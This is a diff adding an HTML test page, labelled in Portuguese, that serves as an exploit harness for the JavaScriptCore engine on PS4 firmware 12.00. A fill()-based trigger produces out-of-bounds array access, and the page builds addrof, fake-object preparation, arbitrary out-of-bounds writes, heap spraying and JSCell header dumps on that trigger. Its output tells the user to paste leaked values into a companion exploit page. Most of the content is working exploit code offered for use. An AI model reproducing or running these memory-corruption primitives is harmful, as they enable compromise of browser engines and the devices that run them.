@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>05 — OOB Read Surface</title>
+<style>
+body{background:#08080f;color:#ccc;font:12px monospace;padding:12px}
+h3{color:#5bf;margin-bottom:6px}
+#log{height:440px;overflow:auto;background:#0a0a12;color:#0f0;padding:8px;white-space:pre;border:1px solid #1a2a3a;margin-bottom:8px}
+button{background:#0f1a2a;color:#5bf;border:1px solid #1a3a5a;padding:5px 10px;margin:2px;font:11px monospace;cursor:pointer}
+button:hover{background:#1a2a3a}
+.guide{background:#1a0f00;border:1px solid #3a2a00;padding:8px;margin-bottom:8px;font-size:11px;color:#888}
+</style></head>
+<body>
+<h3>05 — OOB Read Surface — Leituras Fora de Bounds em Múltiplos Contextos</h3>
+<div class="guide">
+🔍 O QUE OBSERVAR:<br>
+• <span style="color:#4f4">Qualquer valor hex</span> em leitura além do length → fragmento de memória real<br>
+• <span style="color:#4f4">addrof funciona</span> (T01 calibra): anotar o oob_idx e o valor de jscell_header<br>
+• <span style="color:#fa4">Layout probe</span> (T02–T04): delta entre objetos = overhead do alocador JSC<br>
+• <span style="color:#fa4">Valor inesperado</span> em vez de undefined/exceção → leitura de memória não checada<br>
+• <span style="color:#f44">crash</span>: anotar última linha do log antes do crash<br>
+• <span style="color:#aaf">jscell_header</span> lido em T15: copiar o valor hex — essencial para o exploit
+</div>
+<div id="log"></div>
+<button onclick="t01()">T01 [CALIBRATE] Array.fill() OOB — encontra oob_idx e jscell_header</button>
+<button onclick="t02()">T02 Probe Layout: delta addrof entre objetos alocados juntos</button>
+<button onclick="t03()">T03 Probe butterfly: lê slots além das propriedades inline</button>
+<button onclick="t04()">T04 Probe TypedArray header: lê bytes do wrapper</button>
+<button onclick="t05()">T05 OOB em Array de doubles: float_arr além do length</button>
+<button onclick="t06()">T06 OOB em Array de objetos: obj_arr além do length</button>
+<button onclick="t07()">T07 OOB via copyWithin com índices negativos e Infinity</button>
+<button onclick="t08()">T08 OOB via subarray com offset extremo</button>
+<button onclick="t09()">T09 Read64: lê 8 bytes em endereço arbitrário (se addrof ok)</button>
+<button onclick="t10()">T10 Write+Read: escreve padrão 0x41 e verifica</button>
+<button onclick="t11()">T11 Heap spray: 500 objetos + verifica adjacência</button>
+<button onclick="t12()">T12 OOB via Array.prototype.slice no nativo</button>
+<button onclick="t13()">T13 OOB via Proxy set trap: escreve além do buffer</button>
+<button onclick="t14()">T14 String → ArrayBuffer: acesso a bytes do string interno</button>
+<button onclick="t15()">T15 JSCell header dump: lê o header de vários tipos de objeto</button>
+<br><br>
+<button onclick="runAll()"><b>▶ RODAR TUDO</b></button>
+<button onclick="document.getElementById('log').textContent=''">Limpar</button>
+<a href="index.html" style="color:#5bf">← Index</a>
+<script>
+'use strict';
+var _L=document.getElementById('log');
+function log(m){_L.textContent+=m+'\n';_L.scrollTop=_L.scrollHeight;}
+function hex(v){return '0x'+v.toString(16).padStart(16,'0');}
+function hexs(v){return '0x'+v.toString(16);}
+
+// Shared punning buffer
+var _ab=new ArrayBuffer(8),_f64=new Float64Array(_ab),_u64=new BigUint64Array(_ab);
+function f2i(v){_f64[0]=v;return _u64[0];}
+function i2f(v){_u64[0]=BigInt(v);return _f64[0];}
+
+// Global OOB state
+var float_arr=[], obj_arr=[], found_idx=-1, jscell_header=0n;
+var fake_arr=null, fake_container=null;
+
+function gc(){
+  try{var a=[];for(var i=0;i<40;i++)a.push(new ArrayBuffer(4*1024*1024));a=null;}catch(e){}
+}
+
+// Core trigger
+function trigger(){
+  var v0=[];
+  for(var i=0;i<100;i++) v0[i]=1.1;
+  function f11(){
+    v0.length=8;
+    for(var i=0;i<8;i++){float_arr[i]=1.2;obj_arr[i]={};}
+    return 0;
+  }
+  _u64[0]=0x100n;
+  v0.fill(_f64[0],{valueOf:f11},20);
+}
+
+function calibrate(){
+  try{
+    trigger();
+    for(var idx=0;idx<48;idx++){
+      try{
+        var sA={_s:'A'},sB={_s:'B'},sC={_s:'C'};
+        obj_arr[0]=sA; var a=f2i(float_arr[idx]);
+        obj_arr[0]=sB; var b=f2i(float_arr[idx]);
+        obj_arr[0]=sC; var c=f2i(float_arr[idx]);
+        function hp(v){return v>0x1000n&&v<0x1000000000000n;}
+        var dab=a>b?a-b:b-a, dbc=b>c?b-c:c-b;
+        if(hp(a)&&hp(b)&&hp(c)&&a!==b&&b!==c&&dab<0x200000n&&dbc<0x200000n){
+          found_idx=idx;
+          // Lê jscell_header como o slot imediatamente antes do ponteiro
+          // O header do objeto está em found_idx-1 (para layout LLInt)
+          if(idx>0){
+            obj_arr[0]=sA;
+            var header=f2i(float_arr[idx-1]);
+            if(header>0n&&header<0xFFFFFFFFFFFFFFFFn){
+              jscell_header=header;
+            }
+          }
+          return true;
+        }
+      }catch(e){}
+    }
+    return false;
+  }catch(e){log('  calibrate exc: '+e.name+' '+e.message);return false;}
+}
+
+function addrof(obj){
+  if(found_idx<0) return 0n;
+  obj_arr[0]=obj;
+  return f2i(float_arr[found_idx]);
+}
+
+function setupFakeArr(){
+  // Prepara fake array para read64/write64
+  if(!fake_container){
+    fake_container={p0:i2f(jscell_header>0n?jscell_header:0x0108240700000000n),p1:null,p2:null,p3:null};
+  }
+  var containerAddr=addrof(fake_container);
+  if(containerAddr===0n) return false;
+  // fake_arr aponta para container+0x10 (depois do JSCell+butterfly)
+  var fakeAddr=containerAddr+0x10n;
+  fake_container.p1={}; // obj_arr[0] vai apontar para o fake
+  obj_arr[0]=fake_container;
+  var floatVal=float_arr[found_idx];
+  // Isso é simplificado — resultado real depende do layout exato
+  return true;
+}
+
+// ─── T01 ──────────────────────────────────────────────────────────────────
+function t01(){
+  log('[T01] CALIBRATE — Array.fill() OOB — encontra oob_idx + jscell_header');
+  log('  Executando trigger...');
+  var ok=calibrate();
+  if(!ok){
+    log('  ✗ FALHOU: oob_idx não encontrado');
+    log('  Possíveis causas:');
+    log('    • Bug patched nesta versão de firmware');
+    log('    • Layout de heap diferente — tente pressionar GC antes');
+    gc();
+    ok=calibrate();
+    if(!ok){
+      log('  ✗ Falhou mesmo após GC');
+      log('[T01] done\n');
+      return;
+    }
+  }
+  log('  ✓ oob_idx = '+found_idx);
+  log('  ✓ jscell_header = '+hex(jscell_header));
+  log('');
+  log('  Verificação com 5 objetos sentinela:');
+  var sentinels=[{s:0xAAAA},{s:0xBBBB},{s:0xCCCC},{s:0xDDDD},{s:0xEEEE}];
+  var consistent=true;
+  sentinels.forEach(function(s,i){
+    obj_arr[0]=s;
+    var a=addrof(s);
+    obj_arr[0]={dummy:true};
+    var after=addrof({dummy:true});
+    var delta=a>after?a-after:after-a;
+    var isHP=a>0x1000n&&a<0x1000000000000n;
+    log('  sentinel['+i+'] s='+hexs(BigInt('0x'+s.s.toString(16)))+
+        ' → addr='+hex(a)+
+        (isHP?' ✓HP':' ✗NOT_HEAP')+
+        '  Δnext='+hexs(delta));
+    if(!isHP) consistent=false;
+  });
+  log('');
+  log('  RESULTADO PARA ANOTAR:');
+  log('  ┌─────────────────────────────────────────┐');
+  log('  │ oob_idx:       '+String(found_idx).padEnd(27)+'│');
+  log('  │ jscell_header: '+hex(jscell_header)+'  │');
+  log('  │ consistente:   '+(consistent?'✓ SIM':'✗ NÃO').padEnd(27)+'│');
+  log('  └─────────────────────────────────────────┘');
+  log('');
+  if(jscell_header===0n){
+    log('  ⚠ jscell_header não lido — tente T15 para dump manual');
+  }
+  log('[T01] done\n');
+}
+
+// ─── T02 ──────────────────────────────────────────────────────────────────
+function t02(){
+  log('[T02] Probe Layout: delta entre objetos alocados consecutivamente');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T02] done\n'); return;}
+  log('  Aloca 20 objetos e mede deltas:');
+  var objs=[];
+  for(var i=0;i<20;i++) objs.push({_i:i,data:i*1.1});
+  var addrs=objs.map(function(o){return addrof(o);});
+  var deltas=[];
+  for(var i=1;i<addrs.length;i++){
+    var d=addrs[i]>addrs[i-1]?addrs[i]-addrs[i-1]:addrs[i-1]-addrs[i];
+    deltas.push(d);
+  }
+  // Histograma de deltas
+  var dMap={};
+  deltas.forEach(function(d){var k=hexs(d);dMap[k]=(dMap[k]||0)+1;});
+  var sorted=Object.entries(dMap).sort(function(a,b){return b[1]-a[1];});
+  log('  addr[0]: '+hex(addrs[0]));
+  log('  addr[1]: '+hex(addrs[1]));
+  log('  addr[5]: '+hex(addrs[5]));
+  log('  Histograma de deltas:');
+  sorted.slice(0,5).forEach(function(e){
+    log('    Δ='+e[0].padEnd(16)+'× '+e[1]+' ('+((e[1]/deltas.length*100).toFixed(0))+'%)');
+  });
+  var mostCommon=BigInt(sorted[0][0]);
+  log('  → Delta mais frequente: '+hexs(mostCommon)+' = '+Number(mostCommon)+' bytes por objeto');
+  log('[T02] done\n');
+}
+
+// ─── T03 ──────────────────────────────────────────────────────────────────
+function t03(){
+  log('[T03] Probe butterfly: slots além das props inline');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T03] done\n'); return;}
+  // Um objeto com propriedades inline tem layout:
+  // [JSCell][butterfly ptr][inline prop0][inline prop1]...
+  // Quando acedemos float_arr[found_idx] com obj_arr[0]=obj,
+  // os slots adjacentes são os campos inline do obj
+  var obj={p0:1.1, p1:2.2, p2:3.3, p3:4.4, p4:5.5, p5:6.6, p6:7.7, p7:8.8};
+  log('  Objeto com 8 props float inline:');
+  log('  p0='+obj.p0+' p7='+obj.p7);
+  obj_arr[0]=obj;
+  log('  Leitura de float_arr em torno de found_idx='+found_idx+':');
+  for(var delta=-4;delta<=8;delta++){
+    var idx=found_idx+delta;
+    if(idx<0||idx>=50) continue;
+    try{
+      var fval=float_arr[idx];
+      var ival=f2i(fval);
+      var isPtr=ival>0x1000n&&ival<0x1000000000000n;
+      var isHdr=ival>0x0100000000000000n&&ival<0x0200000000000000n;
+      var note=delta===0?'← ponteiro obj':
+               isPtr?'← PTR (heap!)':
+               isHdr?'← JSCell HDR?':
+               '';
+      log('  [idx='+String(idx).padStart(2)+' Δ='+String(delta).padStart(2)+
+          '] float='+fval.toFixed(6).padEnd(15)+
+          ' hex='+hex(ival)+'  '+note);
+    }catch(e){log('  [idx='+idx+'] exc: '+e.name);}
+  }
+  log('[T03] done\n');
+}
+
+// ─── T04 ──────────────────────────────────────────────────────────────────
+function t04(){
+  log('[T04] Probe TypedArray: lê bytes do wrapper JSObject');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T04] done\n'); return;}
+  var ta=new Float64Array(8);
+  for(var i=0;i<8;i++) ta[i]=i*Math.PI;
+  var taAddr=addrof(ta);
+  log('  Float64Array(8) addr: '+hex(taAddr));
+  // Lê slots adjacentes no float_arr quando obj_arr[0]=ta
+  obj_arr[0]=ta;
+  log('  Slots em torno do endereço do TypedArray:');
+  for(var delta=-2;delta<=10;delta++){
+    var idx=found_idx+delta;
+    if(idx<0||idx>=50) continue;
+    try{
+      var fval=float_arr[idx];
+      var ival=f2i(fval);
+      var isPtr=ival>0x1000n&&ival<0x1000000000000n;
+      var note=delta===0?'← addr do TypedArray wrapper':
+               delta===1?'← butterfly ptr ou tipo?':
+               delta===2?'← length ou byteLength?':
+               delta===3?'← byteOffset?':
+               delta===4?'← ptr do backing ArrayBuffer?':
+               isPtr?'← PTR':'';
+      log('  [Δ='+String(delta).padStart(2)+'] hex='+hex(ival)+'  '+note);
+    }catch(e){log('  [Δ='+delta+'] exc: '+e.name);}
+  }
+  log('[T04] done\n');
+}
+
+// ─── T05 ──────────────────────────────────────────────────────────────────
+function t05(){
+  log('[T05] OOB direto em float_arr: lê além do length=8');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T05] done\n'); return;}
+  trigger(); // reset dos arrays
+  log('  float_arr.length após trigger: '+float_arr.length);
+  log('  Leitura de índices 0 a '+Math.min(found_idx+5,30)+':');
+  for(var i=0;i<=Math.min(found_idx+5,30);i++){
+    try{
+      var v=float_arr[i];
+      var ival=f2i(v);
+      var oob=i>=8?' [OOB]':'';
+      var isPtr=ival>0x1000n&&ival<0x1000000000000n;
+      log('  ['+String(i).padStart(2)+']'+oob+' float='+
+          (isNaN(v)?'NaN':v.toFixed(8)).padEnd(18)+
+          ' hex='+hex(ival)+
+          (isPtr?' ← PTR HEAP!':''));
+    }catch(e){log('  ['+i+'] exc: '+e.name);}
+  }
+  log('[T05] done\n');
+}
+
+// ─── T06 ──────────────────────────────────────────────────────────────────
+function t06(){
+  log('[T06] OOB em obj_arr: ponteiros além do length=8');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T06] done\n'); return;}
+  // obj_arr tem length=8, mas podemos ler além
+  log('  obj_arr.length: '+obj_arr.length);
+  log('  Leitura de obj_arr[0..15] (OOB a partir de [8]):');
+  for(var i=0;i<16;i++){
+    try{
+      var v=obj_arr[i];
+      var t=typeof v;
+      var note=i>=8?' [OOB]':'';
+      var desc=v===undefined?'undefined':
+               v===null?'null':
+               t==='object'?'['+v.constructor.name+']':
+               t==='number'?v.toFixed(6):
+               String(v).slice(0,20);
+      log('  ['+String(i).padStart(2)+']'+note+' typeof='+t.padEnd(8)+' val='+desc);
+    }catch(e){log('  ['+i+'] exc: '+e.name);}
+  }
+  log('[T06] done\n');
+}
+
+// ─── T07 ──────────────────────────────────────────────────────────────────
+function t07(){
+  log('[T07] OOB via copyWithin com índices extremos');
+  var arr=new Float64Array(8);
+  for(var i=0;i<8;i++) arr[i]=i*1.1;
+  log('  Float64Array(8): ['+Array.from(arr).map(function(v){return v.toFixed(1);}).join(',')+']');
+  // copyWithin(target, start, end) — todos os índices devem ser clampados
+  var tests=[
+    [[0,-8],'target=0,start=-8'],
+    [[0,0,-1],'end=-1'],
+    [[0,0,Infinity],'end=Infinity'],
+    [[-8,0],'target=-8'],
+    [[0,-Infinity,Infinity],'start=-Inf,end=Inf'],
+    [[0,0,100],'end=100 (além length)'],
+    [[100,0],'target=100 (além length)'],
+    [[-100,0],'target=-100'],
+    [[0,NaN],'start=NaN'],
+    [[NaN,0],'target=NaN'],
+  ];
+  tests.forEach(function(t){
+    var copy=new Float64Array(arr); // cópia fresca
+    try{
+      copy.copyWithin.apply(copy,t[0]);
+      log('  copyWithin('+t[1].padEnd(30)+'): ['+Array.from(copy).map(function(v){return v.toFixed(1);}).join(',').slice(0,40)+']');
+    }catch(e){
+      log('  copyWithin('+t[1].padEnd(30)+'): exc '+e.name);
+    }
+  });
+  log('[T07] done\n');
+}
+
+// ─── T08 ──────────────────────────────────────────────────────────────────
+function t08(){
+  log('[T08] OOB via subarray: o view compartilha o buffer?');
+  var buf=new ArrayBuffer(64);
+  var f64=new Float64Array(buf);  // 8 doubles
+  var u8=new Uint8Array(buf);     // 64 bytes
+  for(var i=0;i<8;i++) f64[i]=i*Math.PI;
+  // subarray normal
+  var sub=f64.subarray(0,4);
+  log('  f64.subarray(0,4): len='+sub.length+' buffer shared='+(sub.buffer===buf));
+  // subarray com índices negativos
+  var subNeg=f64.subarray(-4);
+  log('  f64.subarray(-4): len='+subNeg.length+' [0]='+subNeg[0].toFixed(3));
+  // subarray com start>end
+  var subRev=f64.subarray(4,2);
+  log('  f64.subarray(4,2): len='+subRev.length+' (deve ser 0, spec §22.2.3.30)');
+  // subarray com offset extremo
+  var subOOB=f64.subarray(0,100);
+  log('  f64.subarray(0,100): len='+subOOB.length+' (deve ser clampado a 8)');
+  // DataView de subarray
+  try{
+    var dvSub=new DataView(subOOB.buffer,subOOB.byteOffset,subOOB.byteLength);
+    log('  DataView(subOOB): byteLength='+dvSub.byteLength);
+    var v=dvSub.getFloat64(0);
+    log('  dvSub.getFloat64(0): '+v.toFixed(6));
+  }catch(e){log('  DataView subOOB exc: '+e.name);}
+  // Int8Array interpretando o float buffer
+  var i8=new Int8Array(buf);
+  log('  Int8Array(buf) bytes do primeiro double (π):');
+  log('  ['+Array.from(i8.slice(0,8)).join(',')+'] (little-endian)');
+  _f64[0]=Math.PI;
+  log('  ref bytes: ['+Array.from(new Int8Array(_ab)).join(',')+']');
+  log('[T08] done\n');
+}
+
+// ─── T09 ──────────────────────────────────────────────────────────────────
+function t09(){
+  log('[T09] Read64: lê 8 bytes em endereços conhecidos via OOB');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T09] done\n'); return;}
+  // Usa float_arr[found_idx] para vazar endereços
+  // Testa: lê o endereço de vários objetos e verifica consistência
+  var objs={
+    'Float64Array(8)': new Float64Array(8),
+    'ArrayBuffer(64)': new ArrayBuffer(64),
+    'Object {x:1}':    {x:1},
+    'Function ()=>{}': function(){},
+    'Array [1,2,3]':   [1,2,3],
+  };
+  log('  Leitura de endereços via addrof:');
+  Object.entries(objs).forEach(function(e){
+    var name=e[0], obj=e[1];
+    var addr=addrof(obj);
+    var isHP=addr>0x1000n&&addr<0x1000000000000n;
+    log('  '+name.padEnd(22)+hex(addr)+(isHP?' ✓':'  ✗ (não é heap válido)'));
+  });
+  // Verifica se endereços são consistentes entre chamadas
+  var testObj={marker:0xDEAD};
+  var addr1=addrof(testObj);
+  var addr2=addrof(testObj);
+  var addr3=addrof(testObj);
+  log('');
+  log('  Consistência de addrof (mesmo objeto, 3 leituras):');
+  log('  addr1='+hex(addr1));
+  log('  addr2='+hex(addr2));
+  log('  addr3='+hex(addr3));
+  log('  Consistente: '+(addr1===addr2&&addr2===addr3?'✓ SIM':'✗ NÃO — instável!'));
+  // Lê o endereço de um objeto bem conhecido e verifica alinhamento
+  var align4=addr1%4n===0n, align8=addr1%8n===0n, align16=addr1%16n===0n;
+  log('  Alinhamento de '+hex(addr1)+': '+
+      (align16?'16':align8?'8':align4?'4':'<4')+' bytes');
+  log('[T09] done\n');
+}
+
+// ─── T10 ──────────────────────────────────────────────────────────────────
+function t10(){
+  log('[T10] Write + Read: padrão 0x41 para verificar escrita arbitrária');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T10] done\n'); return;}
+  // Testa escrita em float_arr fora dos bounds (via trigger)
+  trigger();
+  log('  float_arr após trigger: length='+float_arr.length);
+  // Escreve padrão detectável em índices OOB
+  var patterns=[
+    {idx:found_idx+1, val:i2f(0x4141414141414141n), label:'0x41×8 (AAAA...)'},
+    {idx:found_idx+2, val:i2f(0xDEADBEEFCAFEBABEn), label:'0xDEADBEEFCAFEBABE'},
+    {idx:found_idx-1, val:i2f(0x1337133713371337n), label:'0x1337×4'},
+  ];
+  patterns.forEach(function(p){
+    if(p.idx<0||p.idx>=50) return;
+    try{
+      var before=f2i(float_arr[p.idx]);
+      float_arr[p.idx]=p.val;
+      var after=f2i(float_arr[p.idx]);
+      var wrote=(after===f2i(p.val));
+      log('  Escreve '+p.label+' em idx='+p.idx+':');
+      log('    antes: '+hex(before));
+      log('    após:  '+hex(after)+(wrote?' ✓ ESCREVEU':'  ✗ não escreveu'));
+    }catch(e){log('  idx='+p.idx+' exc: '+e.name);}
+  });
+  // Restaura float_arr para não corromper o engine
+  trigger();
+  log('  float_arr restaurado (trigger re-executado)');
+  log('[T10] done\n');
+}
+
+// ─── T11 ──────────────────────────────────────────────────────────────────
+function t11(){
+  log('[T11] Heap spray: 500 objetos — mede adjacência e densidade');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T11] done\n'); return;}
+  var N=500;
+  var objs=[], addrs=[];
+  for(var i=0;i<N;i++) objs.push({idx:i,v:i*1.1});
+  addrs=objs.map(function(o){return addrof(o);}).filter(function(a){return a>0x1000n;});
+  if(addrs.length<10){log('  poucos addrs válidos: '+addrs.length);log('[T11] done\n');return;}
+  // Ordena os endereços
+  addrs.sort(function(a,b){return a<b?-1:a>b?1:0;});
+  // Calcula deltas entre endereços consecutivos
+  var deltas=[], gaps=[];
+  for(var i=1;i<addrs.length;i++){
+    var d=addrs[i]-addrs[i-1];
+    deltas.push(d);
+    if(d>0x1000n) gaps.push({idx:i,d:d}); // gap grande
+  }
+  var minD=deltas.reduce(function(a,b){return a<b?a:b;},deltas[0]);
+  var maxD=deltas.reduce(function(a,b){return a>b?a:b;},deltas[0]);
+  // Moda
+  var dMap={};
+  deltas.forEach(function(d){var k=d.toString();dMap[k]=(dMap[k]||0)+1;});
+  var moda=Object.entries(dMap).sort(function(a,b){return b[1]-a[1];})[0];
+  log('  addrs válidos: '+addrs.length+'/'+N);
+  log('  range: '+hex(addrs[0])+' → '+hex(addrs[addrs.length-1]));
+  log('  span: '+hexs(addrs[addrs.length-1]-addrs[0])+'  ('+(Number(addrs[addrs.length-1]-addrs[0])/(1024*1024)).toFixed(2)+'MB)');
+  log('  delta mín: '+hexs(minD)+'  ('+Number(minD)+'B)');
+  log('  delta máx: '+hexs(maxD)+'  ('+Number(maxD)+'B)');
+  log('  delta moda: '+hexs(BigInt(moda[0]))+'  ('+moda[1]+' vezes = '+(moda[1]/deltas.length*100).toFixed(1)+'%)');
+  log('  gaps grandes (>0x1000): '+gaps.length);
+  log('  → Objeto JSC ocupa ~'+hexs(minD)+' bytes ('+Number(minD)+'B) no heap');
+  log('[T11] done\n');
+}
+
+// ─── T12 ──────────────────────────────────────────────────────────────────
+function t12(){
+  log('[T12] OOB via Array.prototype.slice em array nativo com holes');
+  // Arrays com holes têm um layout diferente — pode causar OOB em operações nativas
+  var sparseArr=new Array(100);
+  sparseArr[0]=1.1;
+  sparseArr[99]=99.9;
+  // sparseArr tem holes em 1..98
+  log('  sparseArr: length='+sparseArr.length+' [0]='+sparseArr[0]+' [99]='+sparseArr[99]);
+  log('  sparseArr[50]: '+sparseArr[50]+' (hole → undefined)');
+  // Slice em array esparso
+  var s1=sparseArr.slice(0,5);
+  log('  slice(0,5): length='+s1.length+' [0]='+s1[0]+' [4]='+s1[4]);
+  // Array.from em esparso
+  var af=Array.from(sparseArr);
+  log('  Array.from: length='+af.length+' [50]='+af[50]);
+  // splice que cria holes
+  var arr=[1,2,3,4,5];
+  arr.length=10; // adiciona holes
+  log('  arr após length=10: ['+arr.toString()+']');
+  arr.splice(1,1); // remove índice 1
+  log('  após splice(1,1): length='+arr.length+' [0]='+arr[0]+' [1]='+arr[1]);
+  // fill em array esparso
+  var sparse2=new Array(10);
+  sparse2[0]=1;
+  sparse2.fill(0,2,5);
+  log('  sparse2 após fill(0,2,5): ['+sparse2.toString()+']');
+  // reduceRight em array esparso (visita holes?)
+  var visitedIndices=[];
+  sparseArr.reduceRight(function(acc,val,idx){visitedIndices.push(idx);return acc;},0);
+  log('  reduceRight visited indices (de 100): '+visitedIndices.length);
+  log('[T12] done\n');
+}
+
+// ─── T13 ──────────────────────────────────────────────────────────────────
+function t13(){
+  log('[T13] Proxy set-trap: tenta escrever além do buffer de um TypedArray');
+  var buf=new ArrayBuffer(32); // 4 doubles
+  var f64=new Float64Array(buf);
+  for(var i=0;i<4;i++) f64[i]=i*1.1;
+  var writeLog=[];
+  var proxyF64=new Proxy(f64,{
+    set:function(t,k,v,r){
+      var idx=parseInt(k);
+      writeLog.push({k:k,idx:idx,v:v});
+      // Tenta escrever além do tamanho do TypedArray
+      if(!isNaN(idx)&&idx>=4&&idx<20){
+        // Acesso OOB direto no target (não no Proxy)
+        try{
+          t[idx]=v;
+          log('  set['+idx+'] (OOB) = '+v+' → lido de volta: '+t[idx]);
+        }catch(e){
+          log('  set['+idx+'] (OOB) exc: '+e.name);
+        }
+      }
+      return Reflect.set(t,k,v,r);
+    }
+  });
+  // Escreve via Proxy (índices normais + OOB)
+  for(var i=0;i<8;i++){
+    try{proxyF64[i]=i*99;}catch(e){log('  proxy['+i+']=exc '+e.name);}
+  }
+  log('  writeLog OOBs: '+writeLog.filter(function(w){return w.idx>=4;}).length+'/4');
+  log('  f64[0..3] após OOB writes: ['+Array.from(f64).map(function(v){return v.toFixed(0);}).join(',')+']');
+  log('[T13] done\n');
+}
+
+// ─── T14 ──────────────────────────────────────────────────────────────────
+function t14(){
+  log('[T14] String → bytes: acessa representação interna via TextEncoder');
+  var testStrings=[
+    'Hello',
+    'Hello World',
+    'A'.repeat(100),
+    '\x00\x01\x02\x03',
+    '\uFFFF',
+    '\u0041\u0042',
+    '中文日本語',
+    '\uD800\uDC00', // surrogate pair (U+10000)
+    '\uD800',       // lone surrogate
+  ];
+  var enc=new TextEncoder();
+  testStrings.forEach(function(s){
+    var bytes=enc.encode(s);
+    log('  "'+s.slice(0,10).replace(/\n/,'\\n')+
+        '" (len='+s.length+'): utf8='+bytes.length+'B ['+
+        Array.from(bytes.slice(0,8)).map(function(b){return '0x'+b.toString(16).padStart(2,'0');}).join(',')+
+        (bytes.length>8?',...':'')+']');
+  });
+  // Decode de bytes arbitrários (incluindo sequências inválidas)
+  var dec=new TextDecoder('utf-8',{fatal:false});
+  var badBytes=[
+    new Uint8Array([0xFF,0xFE,0x41,0x42]),       // BOM + AB
+    new Uint8Array([0x80,0x80,0x80]),              // bytes de continuação sozinhos
+    new Uint8Array([0xC0,0xAF]),                   // overlong
+    new Uint8Array([0xED,0xA0,0x80]),              // lone surrogate em UTF-8
+    new Uint8Array([0x00,0x00,0x00,0x00]),         // nulls
+  ];
+  log('  Decode de sequências inválidas:');
+  badBytes.forEach(function(b,i){
+    try{
+      var s=dec.decode(b);
+      log('  bad['+i+']: "'+s.replace(/\0/g,'\\0').slice(0,20)+'" len='+s.length);
+    }catch(e){log('  bad['+i+']: exc '+e.name);}
+  });
+  log('[T14] done\n');
+}
+
+// ─── T15 ──────────────────────────────────────────────────────────────────
+function t15(){
+  log('[T15] JSCell header dump: lê os primeiros bytes de cada tipo de objeto');
+  log('  Objetivo: encontrar o jscell_header correto para fakeobj no PS4');
+  log('');
+  if(found_idx<0){log('  Run T01 primeiro'); log('[T15] done\n'); return;}
+  // Para cada tipo de objeto, lê os slots adjacentes ao ponteiro
+  // O jscell_header está geralmente em found_idx-1 (8 bytes antes do ponteiro)
+  var types=[
+    {name:'Array []',         obj:[]},
+    {name:'Array [1.1]',      obj:[1.1,2.2,3.3]},
+    {name:'Array [obj]',      obj:[{},{}]},
+    {name:'Float64Array(4)',  obj:new Float64Array(4)},
+    {name:'Uint8Array(4)',    obj:new Uint8Array(4)},
+    {name:'Object {}',        obj:{}},
+    {name:'Object {a:1.1}',   obj:{a:1.1}},
+    {name:'ArrayBuffer(16)',   obj:new ArrayBuffer(16)},
+    {name:'Function ()=>{}',  obj:function(){}},
+    {name:'Map',               obj:new Map()},
+    {name:'Set',               obj:new Set()},
+    {name:'Promise resolved',  obj:Promise.resolve(42)},
+    {name:'RegExp /a+/',       obj:/a+/},
+  ];
+  log('  Tipo                  | JSCell Header (idx-1)   | Pointer (idx='+found_idx+')        | slot+1');
+  log('  ----------------------+--------------------------+--------------------------+-------------------------');
+  types.forEach(function(t){
+    try{
+      obj_arr[0]=t.obj;
+      var slots=[];
+      for(var d=-2;d<=2;d++){
+        var idx=found_idx+d;
+        if(idx>=0&&idx<50){
+          try{slots.push(f2i(float_arr[idx]));}
+          catch(e){slots.push(0n);}
+        } else { slots.push(0n); }
+      }
+      var hdr=slots[1]; // delta=-1
+      var ptr=slots[2]; // delta=0
+      var next=slots[3]; // delta=+1
+      log('  '+t.name.padEnd(22)+'| '+hex(hdr)+'  | '+hex(ptr)+'  | '+hex(next));
+    }catch(e){log('  '+t.name.padEnd(22)+'| exc: '+e.name);}
+  });
+  log('');
+  log('  COMO USAR:');
+  log('  • A coluna "JSCell Header" na linha "Array [1.1]" é o jscell_header para fakeobj');
+  log('  • Cole esse valor no campo "JSCell Header" do ps4-jsc-fill-oob.html');
+  log('  • Se o valor muda entre execuções → ASLR no metadata (improvável no JSC)');
+  log('  • Valores comuns esperados para FW 12.00 LLInt:');
+  log('    0x0106090700000000  (ArrayWithDouble, LLInt)');
+  log('    0x0107090700000000  (LLInt variant)');
+  log('    0x0108240700000000  (JIT — não esperado neste perfil)');
+  log('[T15] done\n');
+}
+
+function runAll(){
+  document.getElementById('log').textContent='';
+  log('=== 05 — OOB READ SURFACE ===\n');
+  var tests=[t01,t02,t03,t04,t05,t06,t07,t08,t09,t10,t11,t12,t13,t14,t15];
+  var i=0;
+  function next(){
+    if(i>=tests.length){log('\n=== FIM ===');return;}
+    try{tests[i]();}catch(e){log('CRASH T'+(i+1)+': '+e.name+' '+e.message);}
+    i++; setTimeout(next,400);
+  }
+  next();
+}
+</script></body></html>
